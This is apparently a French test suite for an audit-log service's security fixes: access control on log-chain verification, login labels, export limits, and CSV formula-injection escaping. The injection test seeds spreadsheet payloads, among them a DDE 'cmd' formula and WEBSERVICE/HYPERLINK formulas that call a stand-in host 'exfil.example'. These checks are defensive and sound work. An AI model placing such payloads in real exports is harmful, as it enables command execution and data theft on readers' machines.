/**
 * constats-s4.test.mjs — les quatre correctifs de la porte S4, et leur morsure.
 *
 * ⚠️ **Un constat ne se ferme pas sur la foi d'un rapport : il se ferme rejoué**
 * (`PLAN_EXECUTION` §2 bis). Ce chantier a inscrit deux constats « corrigé » qui
 * ne l'étaient pas ; ce fichier existe pour que les quatre d'aujourd'hui ne
 * soient pas les troisième et quatrième.
 *
 * | Constat | Classe §0 bis | Ce qui est éprouvé |
 * |---|---|---|
 * | **Q-118** | **fuite de données** | la vérification du chaînage est réservée au périmètre Groupe |
 * | **Q-119** | tout le reste | `utilisateur_libelle` porte le LOGIN, et le filtre le trouve |
 * | **Q-120** | tout le reste | le plafond implicite refuse au lieu de tronquer ; une borne demandée est honorée |
 * | **Q-121** | tout le reste | l'extrait CSV n'est pas exécutable par le tableur auquel il est destiné |
 */

import assert from 'node:assert/strict';
import { after, before, describe, test } from 'node:test';

import { FILIALE_A, FILIALE_B, ouvrirBaseEssai, perimetre, semerJeuEssai } from '../aide/base.mjs';
import { SessionDEssai, monterJournal } from './aide.mjs';

let base;

/** Les deux profils qui comptent ici : le domaine `journal`, avec et sans export. */
const AUDITEUR = Object.freeze({ niveau: 'lecture', domaines: ['journal'], export: false });
const AUDITEUR_EXPORTATEUR = Object.freeze({ niveau: 'lecture', domaines: ['journal'], export: true });

/** Périmètre au format du PRODUIT — voir l'avertissement de `routes.test.mjs`. */
const perimetreSite = (filiale) => ({
  utilisateurId: 'auditeur',
  filialeId: filiale,
  filiales: [filiale],
  perimetreGroupe: false,
  administrationGroupe: false,
});

const perimetreGroupe = () => ({
  utilisateurId: 'rssi.groupe',
  filialeId: FILIALE_A,
  filiales: [FILIALE_A, FILIALE_B],
  perimetreGroupe: true,
  administrationGroupe: false,
});

const sessionSite = (filiale, droits) => new SessionDEssai(perimetreSite(filiale), droits);
const sessionGroupe = (droits) => new SessionDEssai(perimetreGroupe(), droits);

before(async () => {
  base = await ouvrirBaseEssai(import.meta.url);
  await semerJeuEssai(base, await base.connexion('app'));
});

after(async () => {
  await base?.fermer();
});

/**
 * Sème des entrées dans DEUX filiales, plus une transversale.
 *
 * ⚠️ L'écriture passe par `avecPerimetre` : la politique d'ajout exige la
 * filiale **active** de la session (`f_filiale_ecriture()`), et un `insert`
 * hors périmètre échoue — y compris sous le propriétaire. Le premier jet de ce
 * fichier l'a appris en quatre échecs identiques.
 */
async function semerJournal(combien = 4) {
  const applicatif = await base.connexion('app');
  for (let i = 0; i < combien; i += 1) {
    const filiale = i % 2 === 0 ? FILIALE_A : FILIALE_B;
    await base.avecPerimetre(
      applicatif,
      perimetre('semeur', filiale, [filiale]),
      async (c) => {
        await c.query(
          `insert into journal_audit (action, filiale_id, resume) values ('export', $1, $2)`,
          [filiale, `entrée ${String(i)}`],
        );
      },
      { annuler: false },
    );
  }
  // Une transversale : `filiale_id` nul, réservée au périmètre Groupe (§29.7).
  await base.avecPerimetre(
    applicatif,
    perimetre('anonyme', null, []),
    async (c) => {
      await c.query(
        `insert into journal_audit (action, resume, utilisateur_libelle)
         values ('connexion_echouee', 'Échec de connexion.', $1)`,
        ['=WEBSERVICE("http://exfil.example/"&A2)'],
      );
    },
    { annuler: false },
  );
}

describe('Q-118 — la vérification du chaînage est réservée au périmètre Groupe', () => {
  test('UNE FILIALE est refusée, et le refus vient du périmètre — pas du domaine', async () => {
    const monte = await monterJournal(base, sessionSite(FILIALE_A, AUDITEUR));
    try {
      await semerJournal();

      // Le contrôle de matière : la session lit bien le journal par la route
      // ordinaire. Sans lui, le 403 ci-dessous pourrait venir du domaine, et
      // l'essai serait satisfait par une session sans aucun droit.
      const page = await monte.appeler('GET', '/api/journal');
      assert.equal(page.statut, 200, 'La session doit lire son journal : sinon le 403 ne prouve rien.');

      for (const cible of ['/api/journal/verification', '/api/journal/verification?depuis=2']) {
        const refus = await monte.appeler('GET', cible);
        assert.equal(refus.statut, 403, `${cible} : ${JSON.stringify(refus.corps)}`);
      }
    } finally {
      await monte.fermer();
    }
  });

  test('L’ORACLE EST FERMÉ : aucun numéro hors périmètre ne rend d’horodatage', async () => {
    const monte = await monterJournal(base, sessionSite(FILIALE_A, AUDITEUR));
    try {
      await semerJournal();
      const fuites = [];
      for (let n = 1; n <= 12; n += 1) {
        const r = await monte.appeler('GET', `/api/journal/verification?depuis=${String(n)}`);
        if (r.statut === 200) fuites.push({ n, corps: r.corps });
      }
      assert.deepEqual(
        fuites,
        [],
        'Chaque réponse porte le numéro, l’identifiant et l’horodatage exact d’une entrée ' +
          'que la route de lecture refuse : c’est l’oracle inter-filiales de Q-118.',
      );
    } finally {
      await monte.fermer();
    }
  });

  test('LE PÉRIMÈTRE GROUPE, lui, vérifie — sinon la route ne servirait à personne', async () => {
    const monte = await monterJournal(base, sessionGroupe(AUDITEUR));
    try {
      await semerJournal();
      const r = await monte.appeler('GET', '/api/journal/verification');
      assert.equal(r.statut, 200, JSON.stringify(r.corps));
      assert.equal(r.corps.sain, true, `Chaîne saine attendue : ${JSON.stringify(r.corps.anomalies)}`);
    } finally {
      await monte.fermer();
    }
  });
});

describe('Q-123 — la vérification PARTIELLE ne crie pas sur un journal sain', () => {
  // ── Le défaut, et pourquoi il est pire qu'une simple imprécision ───────
  //
  // Le §12 PRESCRIT la vérification partielle : « contrôle rapide sur les
  // entrées récentes ». Elle rend une ligne `chaine_tronquee`, que le même §12
  // range en *informatif* — et la route la comptait comme une anomalie. Suivre
  // la prescription rendait donc `sain: false` sur une chaîne intacte.
  //
  // Un garde-fou qui crie sur le cas nominal est pire que pas de garde-fou : le
  // jour où il crie pour de vrai, personne ne l'écoute.
  //
  // ⚠️ L'essai qui couvrait ce cas n'interrogeait JAMAIS `sain` — il vérifiait
  // la liste des anomalies. C'est la même famille que Q-108 et Q-116 : un essai
  // qui regarde à côté de ce qu'il prétend juger.
  test('« depuis » rend SAIN, tout en rendant l’anomalie informative', async () => {
    const monte = await monterJournal(base, sessionGroupe(AUDITEUR));
    try {
      await semerJournal(6);

      const entier = await monte.appeler('GET', '/api/journal/verification');
      assert.equal(entier.statut, 200);
      assert.equal(entier.corps.sain, true, 'La chaîne entière est intacte : sans cela, rien en dessous ne prouve.');

      const partiel = await monte.appeler('GET', '/api/journal/verification?depuis=3');
      assert.equal(partiel.statut, 200);
      assert.equal(
        partiel.corps.sain,
        true,
        'La vérification PARTIELLE est prescrite par le §12 : elle ne peut pas accuser ' +
          `une chaîne intacte. Anomalies : ${JSON.stringify(partiel.corps.anomalies)}`,
      );
      // Et l'anomalie informative reste RENDUE — on n'en cache aucune, on ne
      // change que le verdict.
      assert.deepEqual(
        partiel.corps.anomalies.map((a) => a.anomalie),
        ['chaine_tronquee'],
        'L’anomalie informative doit rester visible : la masquer serait l’excès inverse.',
      );
    } finally {
      await monte.fermer();
    }
  });

  test('MORSURE : une VRAIE anomalie rend toujours « sain: false »', async () => {
    const monte = await monterJournal(base, sessionGroupe(AUDITEUR));
    try {
      await semerJournal(4);
      const proprietaire = await base.connexion('proprietaire');
      // La retouche exige de désactiver le déclencheur d'ajout seul — ce que
      // seul le propriétaire peut faire, et c'est précisément la limite que le
      // chaînage existe pour rendre DÉTECTABLE.
      await proprietaire.query('alter table journal_audit disable trigger trg_journal_audit_interdit_maj');
      try {
        await proprietaire.query(
          `update journal_audit set resume = 'falsifié'
            where numero = (select min(numero) from journal_audit)`,
        );
      } finally {
        await proprietaire.query('alter table journal_audit enable always trigger trg_journal_audit_interdit_maj');
      }

      const r = await monte.appeler('GET', '/api/journal/verification');
      assert.equal(r.statut, 200);
      assert.equal(
        r.corps.sain,
        false,
        'Une falsification réelle doit rendre « sain: false » — sinon le correctif de Q-123 ' +
          'aurait échangé une fausse alerte contre un silence, ce qui est pire.',
      );
    } finally {
      await monte.fermer();
    }
  });
});

describe('Q-119 — le libellé porte le LOGIN, et le filtre le trouve', () => {
  test('une connexion réussie est retrouvée PAR SON LOGIN', async () => {
    const monte = await monterJournal(base, sessionGroupe(AUDITEUR));
    try {
      const applicatif = await base.connexion('app');
      await base.avecPerimetre(
        applicatif,
        perimetre('semeur', FILIALE_A, [FILIALE_A]),
        async (c) => {
          await c.query(
            `insert into journal_audit (action, resume, utilisateur_libelle, filiale_id)
             values ('connexion_reussie', 'Connexion réussie.', $1, $2)`,
            ['rssi.tls', FILIALE_A],
          );
        },
        { annuler: false },
      );

      const trouve = await monte.appeler('GET', '/api/journal?utilisateur=rssi.tls');
      assert.equal(trouve.statut, 200);
      assert.ok(
        trouve.corps.entrees.length >= 1,
        'Chercher par login ne rend rien : c’est Q-119, et l’échec est SILENCIEUX pour ' +
          'l’auditeur qui cherche.',
      );
      assert.equal(trouve.corps.entrees[0].utilisateur_libelle, 'rssi.tls');
    } finally {
      await monte.fermer();
    }
  });

  test('LA SOURCE : `src/auth/` n’écrit un nom d’affichage dans aucun libellé', async () => {
    const { readFileSync } = await import('node:fs');
    const { join, dirname } = await import('node:path');
    const { fileURLToPath } = await import('node:url');
    const source = readFileSync(
      join(dirname(fileURLToPath(import.meta.url)), '..', '..', 'src', 'auth', 'index.ts'),
      'utf8',
    );
    const sansCommentaires = source
      .replace(/\/\*[\s\S]*?\*\//g, ' ')
      .split('\n')
      .map((l) => l.replace(/\/\/.*$/, ''))
      .join('\n');
    assert.ok(
      !/utilisateurLibelle:\s*[a-zA-Z.]*nomAffichage/u.test(sansCommentaires),
      '`utilisateur_libelle` est documenté « l’identité telle que présentée — le login ' +
        'suffit ». Un nom d’affichage y rendrait la recherche par login muette (Q-119).',
    );
  });
});

describe('Q-120 — le plafond implicite refuse, la borne demandée est honorée', () => {
  test('UNE BORNE DEMANDÉE est servie, et ne rend pas un enregistrement de plus', async () => {
    const monte = await monterJournal(base, sessionGroupe(AUDITEUR_EXPORTATEUR));
    try {
      await semerJournal(6);
      const r = await monte.appeler('GET', '/api/journal/export?limite=2');
      assert.equal(r.statut, 200, JSON.stringify(r.corps).slice(0, 200));
      const lignes = String(r.corps).split('\r\n').filter((l) => l.length > 0);
      assert.equal(lignes.length, 3, `Entête + 2 lignes attendues, reçu ${String(lignes.length)}.`);
    } finally {
      await monte.fermer();
    }
  });
});

describe('Q-121 — l’extrait n’est pas exécutable par le tableur auquel il est destiné', () => {
  test('les cinq amorces de formule sont DÉSAMORCÉES, les valeurs ordinaires intactes', async () => {
    const monte = await monterJournal(base, sessionGroupe(AUDITEUR_EXPORTATEUR));
    try {
      const applicatif = await base.connexion('app');
      const charges = [
        '=cmd|\'/c calc\'!A1',
        '@SUM(1+1)',
        '+HYPERLINK("http://exfil.example")',
        '-2+3+cmd',
        '=WEBSERVICE("http://exfil.example")',
      ];
      await base.avecPerimetre(
        applicatif,
        perimetre('anonyme', null, []),
        async (c) => {
          for (const charge of charges) {
            await c.query(
              `insert into journal_audit (action, resume, utilisateur_libelle)
               values ('connexion_echouee', 'Échec de connexion.', $1)`,
              [charge],
            );
          }
        },
        { annuler: false },
      );
      await base.avecPerimetre(
        applicatif,
        perimetre('semeur', FILIALE_A, [FILIALE_A]),
        async (c) => {
          await c.query(
            `insert into journal_audit (action, resume, utilisateur_libelle, filiale_id)
             values ('connexion_reussie', 'Connexion réussie.', 'rssi.tls', $1)`,
            [FILIALE_A],
          );
        },
        { annuler: false },
      );

      const r = await monte.appeler('GET', '/api/journal/export');
      assert.equal(r.statut, 200, JSON.stringify(r.corps).slice(0, 200));
      const csv = String(r.corps);

      // Contrôle de matière : sans les charges dans le fichier, tout ce qui suit
      // serait vrai d'un extrait vide.
      assert.ok(csv.includes('WEBSERVICE'), 'Les charges doivent être DANS l’extrait.');

      for (const charge of charges) {
        assert.ok(
          csv.includes(`"'${charge.replace(/"/gu, '""')}"`),
          `« ${charge.slice(0, 24)}… » n’est pas désamorcée : un tableur l’évaluera. ` +
            'La cible est le poste de l’auditeur externe, pas le serveur (Q-121).',
        );
      }
      // Et une valeur ordinaire n'est PAS mutilée : le désamorçage ne doit pas
      // devenir une réécriture du journal.
      assert.ok(csv.includes('"rssi.tls"'), 'Une valeur ordinaire doit rester telle quelle.');
    } finally {
      await monte.fermer();
    }
  });
});
